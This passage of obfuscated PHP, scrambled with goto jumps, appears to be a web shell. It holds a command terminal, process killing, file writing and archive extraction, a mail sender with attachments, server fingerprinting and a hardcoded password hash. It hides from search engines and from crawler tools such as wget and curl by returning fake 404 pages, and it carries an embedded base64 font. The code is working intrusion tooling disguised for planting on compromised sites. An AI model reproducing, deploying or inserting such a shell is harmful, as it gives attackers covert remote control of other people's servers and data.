SGuib; SGuib: $cmd = execute("tasklist /FI \"PID eq " . $pid . "\""); goto cN02c; zWg0M: } else { $cmd = execute("kill -9 " . $pid); if (strpos($cmd, "such process") === false && strpos($cmd, "not permitted") === false) { goto xIRfW; xIRfW: $cmd = trim(execute("ps -p " . $pid)); goto jYxz0; jYxz0: $check = explode("\n", $cmd); goto bmMex; bmMex: if (count($check) == 1) { $counter++; } goto oogI2; oogI2: } } } } } goto C6XT3; py7jj: $counter = 0; goto SnMEL; C6XT3: if ($counter > 0) { output($counter); } else { output('error'); } goto ZjjEL; phH7q: $allPid = explode(" ", $p['allPid']); goto py7jj; ZjjEL: } goto vTVHe; aTi_J: @ob_start(); goto jqWkr; YoCw1: $GLOBALS['module']['terminal']['id'] = "terminal"; goto TJYqK; C6xk9: $GLOBALS['module']['convert']['content'] = "\n<table class='boxtbl'>\n<thead>\n\t<tr><th colspan='2'><p class='boxtitle'>Convert</p></th></tr>\n</thead>\n<tbody>\n\t<tr><td colspan='2'><textarea style='height:140px;min-height:140px;' id='decodeStr'></textarea></td></tr>\n\t<tr><td colspan='2'><span class='button' onclick='decode_go();'>convert</span></td></tr>\n</tbody>\n<tfoot id='decodeResult'><tr><td colspan='2'>You can also press ctrl+enter to submit</td></tr></tfoot>\n</table>"; goto ST7e8; fAB8I: if (!function_exists('get_filemtime')) { function get_filemtime($file) { return @date("d-M-Y H:i:s", filemtime($file)); } } goto RTPf5; O_mZS: $GLOBALS['module']['network']['title'] = "Network"; goto ukd2b; PfuhY: $GLOBALS['module']['terminal']['js_ontabselected'] = "\nif((!portableMode) && (\$('#terminalOutput').html()=='')) \$('#terminalInput').focus();"; goto mwXG9; rtnGA: if (!function_exists('decompress')) { function decompress($type, $archive, $path) { goto Ywt7B; Ywt7B: $path = realpath($path) . DIRECTORY_SEPARATOR; goto YQSH5; w8QQB: if (is_dir($path)) { chdir($path); if ($type == 'unzip') { if (class_exists('ZipArchive')) { goto FPdA8; fhcB0: $target = $path . basename($archive, ".zip"); goto Z0Y9M; Z0Y9M: if ($zip->open($archive)) { goto C9v_W; S8br9: $zip->close(); goto yxkqE; ZZ3gY: if ($zip->extractTo($target)) { $status = true; } goto S8br9; C9v_W: if (!is_dir($target)) { mkdir($target); } goto ZZ3gY; yxkqE: } goto dm27Q; FPdA8: $zip = new ZipArchive(); goto fhcB0; dm27Q: } } elseif ($type == 'untar') { goto q1i7r; bABKl: $after = count(get_all_files($target)); goto bGnuU; FDi5T: execute("tar xf \"" . basename($archive) . "\" -C \"" . $target . "\""); goto bABKl; smo0D: $before = count(get_all_files($target)); goto FDi5T; bGnuU: if ($before != $after) { $status = true; } goto J8jmG; xbVMh: if (!is_dir($target)) { mkdir($target); } goto smo0D; q1i7r: $target = basename($archive, ".tar"); goto xbVMh; J8jmG: } elseif ($type == 'untargz') { goto QIjRl; j4nnc: execute("tar xzf \"" . basename($archive) . "\" -C \"" . $target . "\""); goto hAF1Y; W8oXf: if ($before != $after) { $status = true; } goto h2Hz1; CntZ8: $before = count(get_all_files($target)); goto j4nnc; Y2gkq: if (strpos(strtolower($archive), ".tar.gz") !== false) { $target = basename($archive, ".tar.gz"); } elseif (strpos(strtolower($archive), ".tgz") !== false) { $target = basename($archive, ".tgz"); } goto MyST4; QIjRl: $target = ""; goto Y2gkq; MyST4: if (!is_dir($target)) { mkdir($target); } goto CntZ8; hAF1Y: $after = count(get_all_files($target)); goto W8oXf; h2Hz1: } } goto dwojt; YQSH5: $status = false; goto w8QQB; dwojt: return $status; goto H8jW8; H8jW8: } } goto paycy; NyTHA: $GLOBALS['module']['explorer']['content'] = $explorer_content; goto YoCw1; RXsLh: echo $nav; goto ukut3; rWVzW: if (!function_exists('get_nav')) { function get_nav($path) { return parse_dir($path); } } goto YxIIQ; dzwZx: ?></title>
<meta charset='utf-8'>
<meta name='robots' content='noindex, nofollow, noarchive'>
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, user-scalable=0">
<link rel='SHORTCUT ICON' href='<?php  goto H8aKC; mFg9b: error_reporting(0); goto VLdqn; LosYP: echo $error_html; goto sWBpT; FAZSs: if (!function_exists('get_filesize')) { function get_filesize($file) { $size = @filesize($file); if ($size !== false) { if ($size <= 0) { return 0; } return format_bit($size); } else { return "???"; } } } goto fAB8I; ajLul: $GLOBALS['module']['mail']['content'] = "\n<table class='boxtbl'>\n<thead>\n\t<tr><th colspan='2'><p class='boxtitle'>Mail</p></th></tr>\n</thead>\n<tbody id='mailTBody'>\n\t<tr><td style='width:120px'>From</td><td colspan='2'><input type='text' id='mailFrom' value='' onkeydown=\"trap_enter(event, 'mail_send');\"></td></tr>\n\t<tr><td>To</td><td><input type='text' id='mailTo' value='' onkeydown=\"trap_enter(event, 'mail_send');\"></td></tr>\n\t<tr><td>Subject</td><td><input type='text' id='mailSubject' value='' onkeydown=\"trap_enter(event, 'mail_send');\"></td></tr>\n</tbody>\n<tfoot>\n\t<tr><td colspan='2'><textarea id='mailContent' style='height:140px;min-height:140px;'></textarea></td></tr>\n\t<tr>\n\t\t<td colspan='2'><span style='width:120px;' class='button' onclick=\"mail_send();\">send</span>\n\t\t<span style='width:120px;' class='button' onclick=\"mail_attach();\">attachment</span>\n\t\t</td>\n\t</tr>\n\t<tr><td colspan='2'><span id='mailResult'></span></td></tr>\n</tfoot>\n</table>\n"; goto P_3LL; ZdRh3: $GLOBALS['module']['convert']['js_ontabselected'] = "\nif((!portableMode) && (\$('#decodeResult').children().length==1)) \$('#decodeStr').focus();"; goto C6xk9; BrMf5: $GLOBALS['module'] = array(); goto itthL; JUcn6: $GLOBALS['module']['processes']['js_ontabselected'] = "show_processes();"; goto uy8kH; qZp7U: $GLOBALS['module']['network']['id'] = "network"; goto O_mZS; rIcZ_: if (!function_exists('write_file')) { function write_file($file, $content) { if ($fh = @fopen($file, "wb")) { if (fwrite($fh, $content) !== false) { return true; } } return false; } } goto QIsHJ; wf11N: ?>
		</div>
		<!--server info end-->

		<?php  goto k4FKb; z7MjW: $GLOBALS['module']['mail']['js_ontabselected'] = "if(!portableMode) \$('#mailFrom').focus();"; goto ajLul; wq59L: if (!function_exists('get_server_info')) { function get_server_info() { goto T02LJ; PzQUV: return $server_info; goto VqNuq; zq7QW: $server_software = getenv('SERVER_SOFTWARE') != '' ? getenv('SERVER_SOFTWARE') . " <span class='strong'>|</span> " : ''; goto MgkwJ; MgkwJ: $server_info['software'] = $server_software . "  PHP " . phpversion(); goto PzQUV; G3INO: $server_info['uname'] = php_uname(); goto zq7QW; XpGgB: $server_info['time_at_server'] = "Time <span class='strong'>@</span> Server : " . @date("d M Y H:i:s", time()); goto G3INO; T02LJ: $server_addr = isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : $_SERVER["HTTP_HOST"]; goto JTDui; JTDui: $server_info['ip_adrress'] = "Server IP : " . $server_addr . " <span class='strong'>|</span> Your IP : " . $_SERVER['REMOTE_ADDR']; goto XpGgB; VqNuq: } } goto K6pNp; U8qM_: if (!function_exists('block_bot')) { function block_bot() { if (isset($_SERVER['HTTP_USER_AGENT']) && preg_match('/bot|spider|crawler|slurp|teoma|archive|track|snoopy|java|lwp|wget|curl|client|python|libwww/i', $_SERVER['HTTP_USER_AGENT'])) { goto WPl9X; ohSMY: header("Status: 404 Not Found"); goto XGAAD; WPl9X: header("HTTP/1.0 404 Not Found"); goto ohSMY; XGAAD: die; goto cpp7A; cpp7A: } elseif (!isset($_SERVER['HTTP_USER_AGENT'])) { goto Kcm98; Kcm98: header("HTTP/1.0 404 Not Found"); goto pdSi9; IIdvW: die; goto B9Njq; pdSi9: header("Status: 404 Not Found"); goto IIdvW; B9Njq: } } } goto HWlTd; M5Xyp: $GLOBALS['pass'] = "39a1d2be05bbe2e2c73fdb96bcba58bbf8cdbe94"; goto GzRGy; vkgk0: ?>'>
<style type="text/css">
@font-face {
	font-family:'ubuntumono';
	src:url(data:application/x-font-woff;charset=utf-8;base64,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